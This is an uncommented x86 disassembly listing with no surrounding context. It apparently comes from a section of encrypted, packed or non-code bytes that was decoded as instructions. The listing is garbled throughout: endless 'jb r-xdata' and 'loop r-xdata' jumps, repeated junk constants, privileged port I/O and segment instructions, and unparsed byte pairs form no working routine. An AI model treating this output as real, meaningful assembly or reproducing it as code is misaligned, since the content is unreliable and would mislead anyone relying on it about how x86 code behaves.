or ebp [ edx + 0x72e2e2f2 ]
jb r-xdata
0x1d1e971d 0x697
jb r-xdata
sbb eax 0xc6a66fbb
fimul [ ebx ]
retn
jb r-xdata
sbb eax 0x596e0b1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push ds
jb r-xdata
outsd
cmpsb [ esi ] [ edi ]
jb r-xdata
or ecx [ eax + 0x5c ]
xchg [ ebx + ebp * 2 - 0x7745f359 ] eax
mov [ ecx + 0x2a ] gs
jb r-xdata
loope r-xdata
jb r-xdata
and cl [ ebx ]
outsb
add ebx [ 0xffffffffdb72721d ]
cmpsd [ esi ] [ edi ]
mov [ edi + 0xca76b84 ] al
sbb eax 0xb51d0697
jb r-xdata
jb r-xdata
imul esp [ edi - 0x737745f4 ] 0x69
sub cl [ ebx ]
dec eax
pop esp
jb r-xdata
push edx
jb r-xdata
push es
sbb eax 0x1db1feb5
xchg edi eax
or bl [ 0xffffffffe2e27a75 ]
loop r-xdata
in eax dx
or eax ebx
and [ 0x7272721d ] ebx
jb r-xdata
mov dl 0x84
imul esp [ ebp - 0x591e7b20 ] 0x55edfec6
and dh [ edx - 0x23f5db97 ]
daa
sbb eax 0xee26611d
jb r-xdata
push cs
loop r-xdata
test eax 0x58100b6e
sbb eax 0x69b7721d
shl [ edx ] 0x1
fistp [ edi + 0x309d0b1e ]
sbb eax 0x7272721d
in eax dx
imul ecx [ esi ] 0xd1b5b3b3
sbb eax 0x1d28360b
sbb eax 0x72727272
jb r-xdata
imul esp [ esi + 0x2267fac6 ] 0xffffffed
out dx al
and ax 0x1d5a
sbb eax 0xe2ea9d61
mov [ ecx + ebp * 2 + 0x5c480b2a ] cl
in eax dx
xor bl [ edi + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x1d
je r-xdata
or bh [ edx + 0x6b848388 ]
cmpsd [ esi ] [ edi ]
or [ ebx ] cl
cli
cmp [ edx + 0x6b848688 ] 0xa7
imul esp [ edx + ecx ] 0x1d1d2e17
mov ebx 0xdac6a66f
xor [ edx + 0x1d ] bl
sbb eax 0xc6c69e61
loop r-xdata
cli
and ch ch
imul ebp [ edx ] 0x1d27260a
sbb eax 0xe2ebda0b
loop r-xdata
mov dl 0xd9
mov dh 0xea
mov dl 0xed
loope r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xb
mov [ esi ] ss
or ebx eax
jmp 0x72b8b4cf
loop r-xdata
sbb eax 0x7272721d
push ss
jb r-xdata
sbb eax 0xe252741d
loop r-xdata
loop r-xdata
sbb eax 0x6bee2661
cmpsb [ esi ] [ edi ]
imul esp [ edi - 0x33774504 ] 0xffffffbc
mov [ edi - 0x3d58947c ] al
imul esp [ esp + eax * 4 ] 0xbc0a76b
pop edx
sbb eax 0xc69e611d
in ax 0xe2
loop r-xdata
or esp [ ebx + ecx ]
jb r-xdata
sbb eax 0x52741d1d
xchg [ ebx + ebp * 2 - 0x7745f559 ] al
add [ ebx + ebp * 2 - 0x5f4f759 ] 0x55
loop r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
popad
push cs
mov cl 0xb5
sbb eax 0xe2e25674
je r-xdata
imul edi [ edi + 0x135b0b1e ] 0x1d
sbb eax 0x72727272
imul esp [ esi - 0x1597193a ] 0x21fd0ba2
sbb eax 0xedaa721d
push ebp
cmpsd [ esi ] [ edi ]
push ds
mov [ 0xb1ea76b ] al
and bl [ eax ]
scasd [ edi ]
push ds
mov bl 0xb2
mov al ah
mov bh [ edi + ecx * 4 ]
xor eax 0xe9d80b41
loop r-xdata
sub ebx [ 0x1e87611d ]
or ebx [ 0xffffffffbe66ed1d ]
jb r-xdata
mov ecx 0xb469212b
sbb eax 0xbe66ed1d
and al 0xb
jb r-xdata
jb r-xdata
jb r-xdata
outsd
loop r-xdata
or ebx [ esi + 0xf ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
or esi edx
in al dx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x2bbe66ed
sbb eax 0x1e87611d
mov cl ah
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x99638a1d
jb r-xdata
push ebp
or edi edx
jb r-xdata
sbb eax 0x7272721d
imul esp [ edi - 0x58945de2 ] 0x18220b1e
shl [ eax ] cl
pop bx
add ebx [ 0x24170b1d ]
sbb eax 0xd2a46b1d
or bh [ ecx - 0x75e2e2ce ]
sbb eax 0x24170b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x1d
xchg esi eax
ffreep st1
mov ah [ ebx - 0x67 ]
jb r-xdata
test [ ebx - 0x51 ] ch
dec edx
mov ah 0x6f
mov bh 0x69
push cs
or ecx [ esi + 0x7272e2e2 ]
jb r-xdata
arpl [ ecx + 0xbb5c1df ] bx
or edx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
je r-xdata
jb r-xdata
cdq
jb r-xdata
outsd
scasd [ edi ]
or esi eax
push eax
sbb eax 0x7272721d
jb r-xdata
inc [ eax ]
sbb eax 0x66ed721d
lds ebp [ esi ]
sbb eax 0x36af6f1d
or esi eax
imul ebx [ edi + 0xfe0b74 ] 0x1d
sbb eax 0xc566ed72
sbb eax 0x36af6f1d
imul ebx [ edi + 0x36 ] 0x1f
sbb eax 0xf2b41d1d
or ebp eax
push cs
sbb eax 0x6f1b691d
outsd
sub bl [ edi ]
pop esi
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
sbb eax 0xbb1721d
pop ss
loop r-xdata
jb r-xdata
shl [ ebp + 0x1d30d20b ] 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x5c
sbb eax 0x7272721d
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
sbb eax 0xdf99638a
jb r-xdata
mov dl [ edx + 0x5c ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x3e0a0a1d
sbb eax 0x17bb0b1d
imul ebx [ ebx ] 0x1f2a6f6f
jb r-xdata
sbb eax 0xe2e24e74
or edx edx
xor [ 0x7272721d ] bl
jb r-xdata
cmpsd [ esi ] [ edi ]
adc al 0xba
mov [ esp + eax * 4 - 0x45e55895 ] al
mov ah cl
test [ ebx - 0x59 ] ch
sbb [ edx + 0x1d1dca0b ] bh
sbb eax 0x32a76b84
or ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
insd
adc [ 0x7272721d ] ebx
mov cl 0xb
jb r-xdata
pop esp
jb r-xdata
loop r-xdata
mov esi 0x900af6c6
sub ebx [ 0xb1dd11d ]
jb r-xdata
sbb eax 0x9e0a96b4
pop edi
sbb eax 0xed22671d
in eax 0xe2
je r-xdata
xor cl [ ebx ]
jne r-xdata
sbb eax 0x55edaa72
or esp [ ecx - 0x18 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cli
in eax dx
xor dl [ fs : ecx + 0x1d ]
sbb eax 0xf2c68661
jb r-xdata
sbb eax 0x2267aeb2
in eax dx
insb
sub ebx [ 0x526f6f1d ]
pop ds
sbb eax 0x20390a1d
sbb eax 0x169f6f1d
outsd
outsb
pop ds
sbb eax 0x9f6b841d
je r-xdata
outsd
cmpsd [ esi ] [ edi ]
test [ cs : ebx - 0x69 ] ch
dec esi
imul edx [ edi + 0x6b84b2ea ] 0x6fb44aaf
jb r-xdata
jb r-xdata
in eax dx
and bl bl
lahf
push ds
or ebx [ ebp + 0x721d1d30 ]
jb r-xdata
jb r-xdata
or ebp [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xe2e24e74
cmpsd [ esi ] [ edi ]
push ds
push 0xea6aeeaf
sbb eax 0x8aee2661
loop r-xdata
mov cl 0x1d
loop r-xdata
in al dx
loop r-xdata
jb r-xdata
jb r-xdata
fsubrp st1
in eax dx
aaa
pop esi
sbb eax 0xc69e611d
mul bl
in eax dx
sub [ esi + 0x1d ] bl
sbb eax 0x1d38b10b
sbb eax 0x1d130a0a
sbb eax 0x19126f6f
sbb eax 0x23880a1d
mov dl 0x6f
jb r-xdata
imul esi [ edi - 0x47c49660 ] 0xb
lahf
or ebx [ 0xffffffff8495881d ]
sbb eax 0x721d1d39
jb r-xdata
movsb [ edi ] [ esi ]
sbb bl [ 0x7272721d ]
jb r-xdata
or al [ eax + 0x9 ]
sbb eax 0xed22671d
clc
sbb ebx [ 0x3a9f6f1d ]
outsd
outsd
push edx
pop ds
sbb eax 0xe1730b1d
loop r-xdata
outsd
lahf
push ss
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or esp [ edx ]
sbb [ 0x7272721d ] bl
sub ecx [ bp + di ]
mov ch 0xb
jb r-xdata
ror [ eax - 0x79774580 ] cl
test [ ebx - 0x59 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or cl [ edx ]
sbb eax 0x17bb0b1d
loop r-xdata
and al 0x1d
sbb eax 0xad2a46b
mov ecx 0x8a1d1d32
loop r-xdata
sbb eax 0xe2e26275
loop r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0xb
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ 0xffffffffa76b841d ] ebx
or cl [ ebx ]
imul ebx [ ecx + 0x1d ] 0xb2941d1d
test al 0x69
cmp cl [ ebx ]
jb r-xdata
imul edi [ edi - 0x48947bfa ] 0xffffffa0
jb r-xdata
loop r-xdata
mov edx 0x1d391d0b
sbb eax 0x72727272
or bh [ ecx ]
and [ 0x169f6f1d ] bl
mov eax [ 0x3264edfa ]
push ecx
sbb eax 0xc686611d
loop r-xdata
mov bh 0xb
popad
call 0x72b8b4ed
jb r-xdata
outsd
push edx
pop ds
sbb eax 0xa769b21d
0xb21de288 0x67ae
shl [ edx ] 0x1
jb r-xdata
sbb eax 0x7272721d
mov cl 0x1d
xchg esi eax
and eax 0xe3e2e0e2
loop r-xdata
0x691d1d05 0xb35
sbb eax 0x1a69e6b4
mov [ esi + 0x19180bb5 ] al
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
or [ ebx ] cl
mov cl 0x2a
sbb eax 0x7272721d
jb r-xdata
dec edx
adc eax 0xb41d1d1d
0xcea155ed 0x6784
mov dl 0xb
jb r-xdata
or [ eax ] 0x67bb1d1d
jb r-xdata
jmp 0x7262f137
push es
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
test [ ebx - 0x59 ] ch
in eax dx
pop si
out dx eax
loop r-xdata
jb r-xdata
xchg edi eax
or ch [ ebx - 0x59 ]
sbb bl [ 0x2267b6b5 ]
in eax dx
xor ax 0xe2e2
loop r-xdata
loope r-xdata
and eax 0xafb40aa7
test eax 0xbf80bb4
sbb eax 0xf888b11d
mov cl 0xb
push edx
xor al 0x1d
sbb eax 0x3ebf6b84
mov ecx 0x6b848188
mov edi 0x8438693c
imul edi [ edi - 0x2b7746fe ] 0xffffff84
imul ebx [ edi - 0x297742f6 ] 0xffffff84
imul esi [ edi - 0x60947b32 ] 0x8
mov ebp 0x1d5e130b
popad
lahf
out dx al
loop r-xdata
fistp [ esi + 0x66edd2c6 ]
in eax dx
jb r-xdata
mov [ 0xbe2e2ea ] al
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
jb r-xdata
imul edi [ ebx ] 0x30e90bb8
sbb eax 0xb972721d
mov bh 0xa0
jb r-xdata
mov al [ 0xbb83b69 ]
mov edi 0xb76b8406
jb r-xdata
push 0xffffffb2
mov cl 0xb1
mov dh ah
mov cl 0xb
mov [ edi ] dh
or dl [ esi + 0x671d1d02 ]
and cl [ ebx ]
daa
adc bl [ 0x7272721d ]
mov dh ah
or edi [ edi ]
adc bl [ 0x7272721d ]
jb r-xdata
sbb eax 0xb35691d
out 0x56 eax
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
arpl [ esi ] cx
int1
and [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x17270b1d
jb r-xdata
aad 0xea
loop r-xdata
mov ebx 0x66ed2267
mov [ 0xbe2e2ea ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov [ 0x1d1c750b ] al
sbb eax 0x84727272
test [ ebx - 0x59 ] ch
xor al 0x84
imul ebp [ edi - 0x457877ea ] 0xffffff88
mov es [ ebx + ebp * 2 - 0x7745eb59 ]
test [ ebx + ebp * 2 - 0x7745e559 ] al
imul ecx [ esi ] 0xe0620e63
loop r-xdata
cwd
das
sbb eax 0x9961841d
movsb [ edi ] [ esi ]
loop r-xdata
and ch ch
mov bh 0x69
push cs
int3
or al [ ecx - 0x44e2e2f8 ]
and ch ch
sbb eax 0x6b84721d
mov bh 0xc
mov [ edi + 0x6b843369 ] cl
or esp [ edi ]
jb r-xdata
and ch ch
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb5
or ebx [ ecx - 0x1b ]
loop r-xdata
cmp edi [ eax + 0x1d30e90b ]
jb r-xdata
sbb eax 0x84b97272
imul edi [ edi - 0x77c7965c ] 0xffffff81
test [ ebx - 0x41 ] ch
stosb [ edi ]
mov ecx 0xa8bf6b84
imul edi [ edx ] 0x1d21a70b
sbb eax 0xaa76b84
or ebp [ ecx + 0x59 ]
sbb eax 0xb2941d1d
mov eax 0x1d30e90b
jb r-xdata
mov ch 0x88
jb r-xdata
jb r-xdata
fucomi st0
jb r-xdata
jb r-xdata
test cl bl
sub eax 0x1d0a8c0b
sbb eax 0x72727272
sbb eax 0xe855ed1d
jpe r-xdata
jb r-xdata
loop r-xdata
mov cl 0xb4
mov [ esi + 0x1d56960b ] ah
sbb eax 0xc69edb72
shr ch cl
in ax dx
pop ss
jb r-xdata
push ebx
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947bd4 ] 0x34
test [ ebx - 0x51 ] ch
push ss
mov [ edi - 0x7b717746 ] al
imul esp [ edi - 0x7b7745ec ] 0xffffff84
imul esp [ edi - 0x337745e6 ] 0xffffff84
imul esp [ edi - 0x35f445e8 ] 0x1d
sbb eax 0xa76b841d
xor cl [ ebx ]
pop ds
test [ ebx - 0x41 ] ch
movsb [ edi ] [ esi ]
imul edi [ eax ] 0x6b848188
mov edi 0x6b84b9aa
mov edi 0xb3a69a8
or ebp ecx
jb r-xdata
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
push cs
jpe r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
imul esp [ esi + 0x1d2f100a ] 0x1d
popad
mov [ es : 0x1d33420b ] al
sbb eax 0x72727272
jb r-xdata
loop r-xdata
xor [ 0xffffffffb972721d ] bl
push ds
test [ ebx - 0x59 ] ch
sbb eax 0x1a0ba21d
jmp r-xdata
aaa
sbb al 0x8a
out 0xe3 al
loop r-xdata
imul esp [ edi - 0x7bdd2ee2 ] 0x6b
cmpsd [ esi ] [ edi ]
cmp bh [ edx + 0x32698f88 ]
mov [ ebx + 0x6b842369 ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
arpl [ esi ] cx
lea eax [ ebx + ebp * 2 - 0x7745c359 ]
jb r-xdata
jb r-xdata
sbb bl [ 0xffffffffed22671d ]
out 0xe2 ax
loop r-xdata
xor dh [ edx - 0x4d995891 ]
or ecx [ edx + 0x15 ]
popad
sbb eax 0xeab41d1d
in eax dx
push ebp
mov eax [ 0x226784ce ]
in eax dx
sbb eax 0x11878a1d
mov ch 0x15
mov ch 0x6b
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
or dl [ eax ]
das
sbb eax 0xa226611d
or eax [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
or ebx ebx
imul esp [ ebx ] 0x3aa76b84
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1d2e170b
sbb eax 0x72727272
0x691d1d05 0xb35
test cl bl
adc ebp ebp
mov cl 0xb4
mov ch 0xb
loope r-xdata
mov [ ebx + ebp * 2 - 0x7745fd59 ] es
test [ edx - 0x1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
adc dl cl
xor [ ebx ] cl
jecxz r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x16 ] ch
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0xe637272
inc eax
imul ebp [ edi + 0x6a76906 ] 0x23
sbb bh ch
dec edx
jecxz r-xdata
retn 0x1d11
imul esp [ edi - 0x737745c4 ] 0xffffff84
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
in eax dx
jb r-xdata
jb r-xdata
or esp ebx
xor al 0x1d
sbb eax 0xed727272
fisubr [ es : edi - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
sahf
out 0xe2 al
loop r-xdata
sbb eax 0x6372721d
mov dl 0xe0
loop r-xdata
push cs
jb r-xdata
jb r-xdata
xchg [ esi ] eax
mov cl 0x84
pop edx
jecxz r-xdata
push 0x34
sbb eax 0xe46e0b1d
loop r-xdata
cmp al 0xba
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x61 ] ch
or [ ebp + 0x1d5e130b ] bh
or ch [ edi + 0x19 ]
sbb eax 0xe40ba21d
xor [ 0x2055ed1d ] bl
outsd
mov edx 0xe72289e0
mov [ ecx ] edi
out 0x24 eax
out 0xd1 al
mov ch [ ecx - 0x41 ]
push ds
imul edi ecx 0xbe6b33e1
shr cl cl
test cl bl
jb r-xdata
mov edx 0x32698f88
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
out dx al
outsd
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45fd5895 ] cl
jb r-xdata
sbb eax 0x64ed721d
jb r-xdata
jb r-xdata
jb r-xdata
jpe r-xdata
loop r-xdata
jb r-xdata
imul esp [ esi + 0x530bfec6 ] 0x19
jb r-xdata
sbb eax 0x17c50b1d
sbb eax 0x2a61721d
adc al 0x5
sbb eax 0xed22671d
sub dl [ edx + 0x25c28e90 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x12
shl [ eax ] 0x1
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
xor cl [ ebx ]
jb r-xdata
mov [ ecx + 0x698388bb ] dl
jb r-xdata
jb r-xdata
xchg edx eax
jb r-xdata
nop
jb r-xdata
add bh [ edx - 0x3df47878 ]
pop edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ecx ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x23698388
jb r-xdata
sbb eax 0xb41d721d
or edx [ ebx + 0x19 ]
jb r-xdata
mov es dx
jb r-xdata
retn 0xa725
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] ebx
mov edx 0xc20b8788
jb r-xdata
push ebp
jb r-xdata
pop ebp
mov eax 0x84e2e295
fldcw [ 0x1d0a8c0b ]
or bl [ 0xffffffffe855ed1d ]
jb r-xdata
jb r-xdata
jb r-xdata
sub [ ecx + 0x23 ] 0xffffff84
jb r-xdata
0xf6c6bedb 0x66ed
sbb [ 0xffffffffb41d721d ] ebx
jb r-xdata
and eax 0x9b8a2ea7
xchg edx eax
xchg [ 0xffffffff949032a7 ] esp
retn 0xac2
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bl [ cs : ebx - 0x58da786e ]
xor dl [ eax + 0xac2c294 ]
iretd
mov dl 0xa
xor [ edx + 0x1d ] dl
sbb eax 0x61f2a769
sbb eax 0x7272721d
jb r-xdata
cmp [ ecx ] 0x1d
in eax dx
xchg [ ebx ] ecx
jb r-xdata
push ebp
jb r-xdata
or esp [ 0x721d1d52 ]
test [ ebx - 0x41 ] ch
sbb [ eax + 0xb386981 ] cl
sub edx [ ecx + 0x1d ]
sbb eax 0x7a64ed72
xor ecx [ ebx ]
pop ebx
pop eax

sbb eax 0x72727221
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c559 ]
jb r-xdata
sbb eax 0xeab41d72
jb r-xdata
push cs
sbb eax 0x6372721d
xchg [ edx ] ebx
loop r-xdata
or dh [ eax ]
push edx
sbb eax 0xf2a7691d
popad
sbb eax 0x7272721d
jb r-xdata
out dx al
or esp [ esi + 0x55 ]
xchg esp eax
mov dl 0xb
push esi
mov dl 0x1d
cmpsd [ esi ] [ edi ]
mov dl 0x1d
rcl [ ebx + 0x1d ] 0x1
sbb eax 0x6fee2661
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x707745c6 ] 0x69
jb r-xdata
push ebp
retn 0x94aa
cmpsd [ esi ] [ edi ]
cmp cl [ ebp + 0x25848d91 ]
cmpsd [ esi ] [ edi ]
xchg esi eax
retn 0x94aa
sbb cl [ edx ]
jb r-xdata
jb r-xdata
and eax 0x90922aa7
jb r-xdata
jb r-xdata
pop esi
sbb eax 0x2eb60b1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
jb r-xdata
test [ ebx ] ebp
jb r-xdata
jb r-xdata
jb r-xdata
call 0xffffffff88b8b9e0
mov [ edi - 0x24f4cd97 ] cl
jb r-xdata
0xe2e72a0b 0x72e2
in eax dx
mov ch 0xb5
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2e8db0b
jb r-xdata
sbb eax 0xd2b41db2
outsd
sub bl [ bx ]
sbb eax 0x3e1a0b1d
sbb eax 0x7272721d
shr [ ebx ] 0x1
and ch ch
jpo r-xdata
cwde
push edx
sbb eax 0x676fb11d
dec esi
mov ch 0xb
jb r-xdata
and eax 0xafaf3aa7
mov edx 0x3ea72587
jb r-xdata
cli
jb r-xdata
loopne r-xdata
jb r-xdata
loop r-xdata
mov [ ebp + 0x3ca76b84 ] cl
jb r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
or eax eax
dec ebp
sbb eax 0xa725721d
or dh [ edi + ebp * 4 - 0x58da4b57 ]
push cs
scasd [ edi ]
test eax 0xa725afb4
mov edx 0x25b48c87
out dx eax
xor [ 0x7272721d ] bl
jb r-xdata
cmp ch [ edi + 0x2587baaf ]
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
xchg esi eax
mov [ bx ] ss
or dl [ eax + 0x22671d1d ]
in eax dx
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x971db21d
or [ ebx - 0x114896e3 ] 0xa
add ebp [ 0x1db21d1d ]
xchg edi eax
dec [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf93a151d
and bh [ ebx + 0x212b3a15 ]
jb r-xdata
test [ ebx - 0x61 ] ch
pop esp
imul ebx [ ecx ] 0x229f6b84
or eax [ edi + 0xd ]
sbb eax 0xcc88ba1d
mov ebp 0x3b0b8788
add [ 0xffffffff8472721d ] ebx
imul esp [ edi - 0x50947be2 ] 0x14
mov ebx 0xb206a76f
imul esp [ edi - 0x50947b16 ] 0x2b850a1a
push ebx
jb r-xdata
ror [ ebx ] 0x1
and eax 0x721d1d52
sbb eax 0x55ed721d
jb r-xdata
jb r-xdata
pop edi
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
adc al 0x1d
or bl [ eax - 0x4ee2e2ae ]
outsd
dec esi
jb r-xdata
and eax 0x918d3aa7
lea eax [ ebp - 0x3d69c159 ]
stosb [ edi ]
xchg esp eax
or edi [ ebp ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ esi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb eax 0xe697272
or eax [ ecx - 0x1c ]
loop r-xdata
fstp [ esi + 0x66edf6c6 ]
mov [ esi + 0x1d ] bl
sbb eax 0x1d2eb60b
sbb eax 0x72727272
jb r-xdata
mov ah 0xea
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ edx + ebp * 2 - 0x1e ] 0xffffffe2
sub bl [ fs : 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
jb r-xdata
call 0x1d782d5a
outsd
cmpsd [ esi ] [ edi ]
add cl [ ebx ]
movsd [ edi ] [ esi ]
xor al 0x1d
sbb eax 0x9602a725
jb r-xdata
imul esp [ edx + esi * 2 - 0x1e ] 0xffffffe2
loop r-xdata
xchg edi eax
sbb eax 0xad69bb1d
loop r-xdata
sbb eax 0xb5727272
jecxz r-xdata
jb r-xdata
imul esp [ edi - 0x787745fe ] 0xb
jb r-xdata
or edi [ ecx + 0x721d1d23 ]
jb r-xdata
xchg [ edx ] ch
sbb eax 0xe5058a1d
bound edx [ edi ]
mov ch 0xb
mov ecx 0x721d1d23
xchg esi eax
sub bl [ 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
stosd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and al 0xb5
sbb eax 0x962e2f8a
or al [ esi - 0x75e2e2d6 ]
add eax 0xb51762e5
sbb eax 0x1d0a7e0b
sbb eax 0x72727272
jb r-xdata
mov ch 0x6b
sbb eax 0xc81fda8a
jb r-xdata
loope r-xdata
jb r-xdata
mov [ edi + 0x1d11c20b ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
enter 0xb570 0x6b
ficomp [ edi ]
jb r-xdata
or edx [ edx ]
pop ebx
sbb eax 0x7272721d
jb r-xdata
push ss
jb r-xdata
or eax edx
jb r-xdata
or ah [ esi + ebp ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
call 0xffffffffd228bcda
sub [ eax ] cl
sbb eax 0xb22671d
or ecx [ edx + 0x3b ]
sbb eax 0xc6961d1d
cli
imul esp [ edx + ecx ] 0x1d1d253c
mov ebx 0x67eead69
sub ebp ebp
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
scasd [ edi ]
imul esp ebx 0xe11aab69
cmp eax 0x24611931
0xf7be6aa0 0xb41
jb r-xdata
jb r-xdata
loop r-xdata
outsd
sbb eax 0xea971d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x1d4f3c0b
sbb eax 0x32a7691d
popad
and dh dh
imul esp [ edi + 0x35e60b1a ] 0x1d
sbb eax 0x72727272
imul esp [ edi + 0x72212bea ] 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x6b
imul esp [ edx + ecx ] 0x1d1d2af3
mov ebx 0x66ed2267
cmpsd [ esi ] [ edi ]
dec esi
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax 0xe2
loop r-xdata
imul edi [ edi + 0xea60a0e ] 0x1d
sbb eax 0x67ee2661
and ch ch
jb r-xdata
loop r-xdata
or bl [ 0x1d1d ]
sbb eax 0x6fea971d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out 0x35 al
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x59230b1d
sbb eax 0x7272721d
jb r-xdata
mov cl 0x1d
je r-xdata
out dx al
imul esp [ edx + esi * 4 + 0x1aa76bb2 ] 0xb216a76f
mov [ 0x1d20b60b ] bl
sbb eax 0xa2266172
mov al [ edi + 0x52 ]
stc
0xbb5
jb r-xdata
jb r-xdata
outsd
or edx [ eax + 0x9 ]
out dx al
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add edx [ bp + di + 0x1d ]
jb r-xdata
mov ch 0xb
mov [ 0x72e2e2e4 ] al
and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
outsd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
movsd [ edi ] [ esi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx + 0x27f30bc6 ] 0x72721d1d
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ebx + 0x1d ]
imul ecx [ esi ] 0x9b70bb3
jb r-xdata
and ebp [ ecx - 0x66 ]
xchg [ esi ] ebx
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x1fda8a1d ]
and al 0xa
sub bl [ 0x2267bb1d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edx + ecx ] 0x1d1d1046
popad
sbb eax 0x67f62661
and ch ch
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
adc ax 0x1d5f
sbb eax 0xe61e9f61
or esp [ ebx ]
push ebx
mul [ es : edi + 0x22 ]
in eax dx
jb r-xdata
jb r-xdata
jne r-xdata
